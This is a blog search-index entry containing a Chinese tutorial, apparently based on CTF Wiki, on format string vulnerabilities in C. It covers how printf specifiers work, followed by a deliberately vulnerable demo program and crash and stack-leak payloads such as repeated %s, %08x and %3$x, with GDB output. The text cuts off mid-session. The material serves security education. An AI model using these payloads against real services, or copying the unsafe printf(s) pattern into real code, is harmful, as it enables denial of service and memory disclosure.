<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一步一步学pwn|格式化字符串(1)</title>
      <link href="/2020/05/19/gen-zhao-ctf-wiki-xue-pwn-ge-shi-hua-zi-fu-chuan-1/"/>
      <url>/2020/05/19/gen-zhao-ctf-wiki-xue-pwn-ge-shi-hua-zi-fu-chuan-1/</url>
      
        <content type="html"><![CDATA[<h1 id="格式化字符串漏洞原理介绍"><a href="#格式化字符串漏洞原理介绍" class="headerlink" title="格式化字符串漏洞原理介绍"></a>格式化字符串漏洞原理介绍</h1><p>首先，对格式化字符串漏洞的原理进行简单介绍。</p><h2 id="格式化字符串函数介绍"><a href="#格式化字符串函数介绍" class="headerlink" title="格式化字符串函数介绍"></a>格式化字符串函数介绍</h2><p>格式化字符串函数可以接受可变数量的参数，<strong>并将第一个参数作为格式化字符串，根据其来解析之后的参数</strong>。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的C/C++程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。一般来说，格式化字符串在利用的时候主要分为三个部分：</p><ul><li>格式化字符串函数</li><li>格式化字符串</li><li>后续参数(可选)</li></ul><p>以printf函数举例：</p><p><img src="https://img-blog.csdnimg.cn/20200519002938310.jpg" alt="在这里插入图片描述"></p><h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><p>常见的格式化字符串函数有：</p><ul><li><p>输入</p><ul><li>scanf</li></ul></li><li><p>输出</p><table><thead><tr><th align="center">函数</th><th align="center">基本介绍</th></tr></thead><tbody><tr><td align="center">printf</td><td align="center">输出到stdout</td></tr><tr><td align="center">fprintf</td><td align="center">输出到指定FILE流</td></tr><tr><td align="center">vpirntf</td><td align="center">根据参数列表格式化输出到stdout</td></tr><tr><td align="center">vfprintf</td><td align="center">根据参数列表格式化输出到指定FILE流</td></tr><tr><td align="center">sprintf</td><td align="center">输出到字符串</td></tr><tr><td align="center">snprintf</td><td align="center">输出指定字节数到字符串</td></tr><tr><td align="center">vsprintf</td><td align="center">根据参数列表格式化输出到字符串</td></tr><tr><td align="center">vsnprintf</td><td align="center">根据参数列表格式化输出指定字节到字符串</td></tr><tr><td align="center">setproctitle</td><td align="center">设置argv</td></tr><tr><td align="center">syslog</td><td align="center">输出日志</td></tr><tr><td align="center">err,verr,warn,vwarn等</td><td align="center">…</td></tr></tbody></table></li></ul><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>格式化字符串的基本格式如下：</p><pre><code>%[parameter][flags][field width][.precision][length]type</code></pre><p><a href="[https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2](https://zh.wikipedia.org/wiki/格式化字符串)">format string-Wikipedia</a></p><ul><li><p>parameter(可选)</p><ul><li>n$,获取格式化字符串中的第n个参数</li></ul></li><li><p>flags(可为0个或多个)</p><table><thead><tr><th align="center">字符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">总是表示有符号数值的’+’或’-‘号，缺省情况是忽略正数的符号。仅适用于数值类型。</td></tr><tr><td align="center">空格</td><td align="center">使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与’+’同时出现，则空格说明符被忽略。</td></tr><tr><td align="center">-</td><td align="center">左对齐。缺省情况是右对齐。</td></tr><tr><td align="center">#</td><td align="center">对于’g’与’G’,不删除尾部0以表示精度。对于’f’,’F’,’e’,’E’,’g’,’G’,总是输出小数点。对于’o’,’x’,’X’,在非0数值前分别输出前缀0,0x,and 0X表示数制。</td></tr><tr><td align="center">0</td><td align="center">如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。例如<code>printf("%2d", 3)</code>输出”<code>3</code>“，而<code>printf("%02d", 3)</code>输出”<code>03</code>“。如果<code>0</code>与<code>-</code>均出现，则<code>0</code>被忽略，即左对齐依然用空格填充。</td></tr></tbody></table></li><li><p>field width</p><ul><li>输出的最小宽度</li></ul></li><li><p>precision</p><ul><li>输出的最大长度</li></ul></li><li><p>length,输出的长度</p><ul><li>hh,输出一个字节</li><li>h，输出一个双字节</li></ul></li><li><p>type</p><ul><li>d/i,有符号整数</li><li>u,无符号整数</li><li>x/X,16进制unsigned int。x使用小写字母;X使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1.精度为0且值为0，则输出为空。</li><li>o，8进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0.默认精度为1.精度为0且值为0，则输出为空。</li><li>s，如果没有用l标志，输出null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用wcrtomb函数。</li><li>c，如果没有用l标志，把int参数转为unsigned char型输出；如果用了l标志，把wint_t参数转为包含两个元素的wchart_t数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。</li><li>p,void *型，输出对应变量的值。printf(“%p”,a)用地址的格式打印变量a的值，printf(“%p”,&amp;a)打印变量a所在的地址。</li><li>n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li><li>%，’%’字面值，不接受任何flags,width。</li></ul></li></ul><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>即相应的要输出的变量。</p><h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>上面说到，格式化字符串函数是根据格式化字符串函数来进行解析的。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。</strong>比如说’%s’表明我们会输出一个字符串参数。</p><p>我们继续以上面的为例子进行介绍</p><p><img src="https://img-blog.csdnimg.cn/2020051900301089.jpg" alt="在这里插入图片描述"></p><p>对于这样的例子，在进入printf函数之前(即还没有调用printf函数)，栈上的布局由高地址到低地址依次为：</p><pre><code>some value    #假设为某个未知的值3.14123456addr of "red"addr of format string: Color %s...</code></pre><p>在进入printf之后，函数首先获取第一个参数，一个一个读取其字符串会遇到两种情况：</p><ul><li>当前字符不是 %，直接输出到相应标准输出。</li><li>当前字符是%，继续读取下一个字符<ul><li>如果没有字符，报错</li><li>如果下一个字符是%，输出%</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p>假设在编写程序的时候，写成了下面的样子</p><pre><code>printf("Color %s,Number %d,Float %4.2f");</code></pre><blockquote><p>即没有提供参数，程序应该如何运行？</p></blockquote><p>程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p><ul><li>1.解析其地址对应的字符串</li><li>2.解析其内容对应的整型值</li><li>3.解析其内容对应的浮点值</li></ul><p>对于2,3来说倒还无妨，但是对于1来说，如果提供了一个不可访问地址，比如0，那么程序就会因此而崩溃。</p><p>这基本就是格式化字符串漏洞的基本原理了。</p><hr><h1 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h1><p>其实，在上一部分，我们展示了格式化字符串漏洞的两个利用手段</p><ul><li>使程序崩溃，因为%s对应的参数地址不合法的概率比较大。</li><li>查看进程内容，根据%d，%f输出了栈上的内容。</li></ul><p>下面我们会对于每一方面进行更加详细的解释。</p><h2 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h2><p>通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们值需要输入若干个%s即可</p><pre><code>%s%s%s%s%s%s%s%s%s%s%s%s%s%s</code></pre><p>这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。</p><h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用格式化字符串的漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作：</p><ul><li>泄露栈内存<ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存<ul><li>利用GOT表得到libc函数地址，进而获取libc，进而获取其它libc函数地址</li><li>盲打，dump整个程序，获取有用信息</li></ul></li></ul><h4 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h4><p>例如，给定如下程序</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后编译，</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c In file included from /usr/include/stdio.h:27:0,                 from leakmemory.c:1:/usr/include/features.h:367:25: fatal error: sys/cdefs.h: No such file or directorycompilation terminated.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是什么奇怪的报错啊…</p><pre class="line-numbers language-c"><code class="language-c">devil@ubuntu<span class="token punctuation">:</span><span class="token operator">~</span>$ gcc <span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector <span class="token operator">-</span>no<span class="token operator">-</span>pie <span class="token operator">-</span>o leakmemory leakmemory<span class="token punctuation">.</span>cleakmemory<span class="token punctuation">.</span>c<span class="token punctuation">:</span> In function ‘main’<span class="token punctuation">:</span>leakmemory<span class="token punctuation">.</span>c<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span> warning<span class="token punctuation">:</span> format not a string literal and no format arguments <span class="token punctuation">[</span><span class="token operator">-</span>Wformat<span class="token operator">-</span>security<span class="token punctuation">]</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>把-m32去掉就好了。</p><p>可以看出，编译器指出了我们的程序中没有给出格式化字符串的参数问题。下面我们来看一下如何获取对应的栈内存。</p><p>根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。</p><h5 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h5><p>首先，我们可以利用格式化字符串来获取栈上变量的数值。我们可以试一下…</p><p>结果是运行没反应，考虑到可能是-m32参数没加的原因，上网查了之前的报错，可能是libc的库有问题。</p><pre class="line-numbers language-shell"><code class="language-shell">sudo apt-get purge libc6-devsudo apt-get install libc6-devsudo apt-get install libc6-dev-i386<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/2020051900303830.jpg" alt="在这里插入图片描述"></p><p>运行还是没反应…我突然发现原来程序要先输入…WSSB</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ ./leakmemory %08x.%08x.%08x00000001.22222222.ffffffff.%08x.%08x.%08xffab5f48.f7f07918.00f0b5ff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，我们确实得到了一些内容。为了更加细致的观察，我们利用 GDB 来调试一下，以便于验证我们的想法，这里删除了一些不必要的信息，我们只关注代码段以及栈。</p><p>首先，启动程序，将断点下载 printf 函数处</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gdb leakmemory gef➤  b printfBreakpoint 1 at 0x8048370<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell"><code class="language-shell">gef➤  rStarting program: /home/devil/leakmemory %08x.%08x.%08x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>敲击回车，程序继续运行，可以看出程序首先断在了第一次调用printf函数的位置</p><pre class="line-numbers language-assembly"><code class="language-assembly">Breakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  "%08x.%08x.%08x"$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7fb787c  →  0x00000000$esp   : 0xffffcfcc  →  0x0804851d  →  <main+98> add esp, 0x20$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfcc│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp0xffffcfd0│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"0xffffcfd4│+0x0008: 0x000000010xffffcfd8│+0x000c: 0x222222220xffffcfdc│+0x0010: 0xffffffff0xffffcfe0│+0x0014: 0xffffd008  →  "%08x.%08x.%08x"0xffffcfe4│+0x0018: 0xffffd008  →  "%08x.%08x.%08x"0xffffcfe8│+0x001c: 0xf7ffd918  →  0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d                  nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")[#1] 0x804851d → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，此时已经进入了printf函数中，<strong>栈中的第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为a的值，第四个变量为b的值，第五个变量为c的值，第六个变量为我们输入的格式化字符串对应的地址。</strong>继续运行程序。</p><pre class="line-numbers language-shell"><code class="language-shell">gef➤  cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个printf处</p><pre class="line-numbers language-assembly"><code class="language-assembly">Breakpoint 1, __printf (format=0xffffd008 "%08x.%08x.%08x") at printf.c:2828    in printf.c[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  "%08x.%08x.%08x"$ebx   : 0x0       $ecx   : 0x7fffffd6$edx   : 0xf7fb7870  →  0x00000000$esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfdc│+0x0000: 0x0804852c  →  <main+113> add esp, 0x10     ← $esp0xffffcfe0│+0x0004: 0xffffd008  →  "%08x.%08x.%08x"0xffffcfe4│+0x0008: 0xffffd008  →  "%08x.%08x.%08x"0xffffcfe8│+0x000c: 0xf7ffd918  →  0x000000000xffffcfec│+0x0010: 0x00f0b5ff0xffffcff0│+0x0014: 0xffffd02e  →  0xffff0000  →  0x000000000xffffcff4│+0x0018: 0x000000010xffffcff8│+0x001c: 0x000000c2─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d                  nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0xffffd008 "%08x.%08x.%08x")[#1] 0x804852c → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，由于格式化字符串为%x%x%x，所以，程序会将栈上的第三个地址开始处(也就是0xffffcfe4)及其以后的数值分别作为第一、第二、第三个参数按照int型进行解析，分别输出。继续运行，我们可以得到如下结果，和想象中一致。</p><pre class="line-numbers language-shell"><code class="language-shell">gef➤  cContinuing.ffffd008.f7ffd918.00f0b5ff[Inferior 1 (process 4193) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当然，我们也可以使用%p来获取数据，如下</p><pre><code>gef➤  rStarting program: /home/devil/leakmemory %p.%p.%p00000001.22222222.ffffffff.%p.%p.%p0xffffd008.0xf7ffd918.0xf0b5ff[Inferior 1 (process 4253) exited normally]</code></pre><p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p><p><strong>那么有没有办法直接获取栈中被视为第n+1个参数的值呢？</strong></p><p>方法如下：</p><pre><code>%n$x</code></pre><p>利用如上的字符串，我们就可以获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。</p><p>我们再次以gdb调试一下。</p><pre class="line-numbers language-sh"><code class="language-sh">devil@ubuntu:~$ gdb leakmemorygef➤  b printfBreakpoint 1 at 0x8048370gef➤  rStarting program: /home/devil/leakmemory %3$xBreakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  "%3$x"$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7fb787c  →  0x00000000$esp   : 0xffffcfcc  →  0x0804851d  →  <main+98> add esp, 0x20$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfcc│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp0xffffcfd0│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"0xffffcfd4│+0x0008: 0x000000010xffffcfd8│+0x000c: 0x222222220xffffcfdc│+0x0010: 0xffffffff0xffffcfe0│+0x0014: 0xffffd008  →  "%3$x"0xffffcfe4│+0x0018: 0xffffd008  →  "%3$x"0xffffcfe8│+0x001c: 0xf7ffd918  →  0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d                  nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")[#1] 0x804851d → main()gef➤  cContinuing.00000001.22222222.ffffffff.%3$xBreakpoint 1, __printf (format=0xffffd008 "%3$x") at printf.c:2828    in printf.c[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  "%3$x"$ebx   : 0x0       $ecx   : 0x7fffffe0$edx   : 0xf7fb7870  →  0x00000000$esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfdc│+0x0000: 0x0804852c  →  <main+113> add esp, 0x10     ← $esp0xffffcfe0│+0x0004: 0xffffd008  →  "%3$x"0xffffcfe4│+0x0008: 0xffffd008  →  "%3$x"0xffffcfe8│+0x000c: 0xf7ffd918  →  0x000000000xffffcfec│+0x0010: 0x00f0b5ff0xffffcff0│+0x0014: 0xffffd02e  →  0xffff0000  →  0x000000000xffffcff4│+0x0018: 0x000000010xffffcff8│+0x001c: 0x000000c2─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d                  nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0xffffd008 "%3$x")[#1] 0x804852c → main()gef➤  cContinuing.f0b5ff[Inferior 1 (process 4290) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>栈上第一个值是返回地址，第二个值是格式化字符串地址，第三个是格式化字符串第一个参数，第四个是格式化字符串第二个参数，第五个是格式化字符串第三个参数，也就是我们要输出的0x00f0b5ff。<strong>注意，格式化字符串的第三个参数是printf函数输出的第四个参数。</strong></p><h5 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h5><p>此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到 %s 了。这里还是使用上面的程序，进行 gdb 调试，如下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gdb leakmemorygef➤  b printfBreakpoint 1 at 0x8048370gef➤  rStarting program: /home/devil/leakmemory %sBreakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  0x00007325 ("%s"?)$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7fb787c  →  0x00000000$esp   : 0xffffcfcc  →  0x0804851d  →  <main+98> add esp, 0x20$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfcc│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp0xffffcfd0│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"0xffffcfd4│+0x0008: 0x000000010xffffcfd8│+0x000c: 0x222222220xffffcfdc│+0x0010: 0xffffffff0xffffcfe0│+0x0014: 0xffffd008  →  0x00007325 ("%s"?)0xffffcfe4│+0x0018: 0xffffd008  →  0x00007325 ("%s"?)0xffffcfe8│+0x001c: 0xf7ffd918  →  0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d      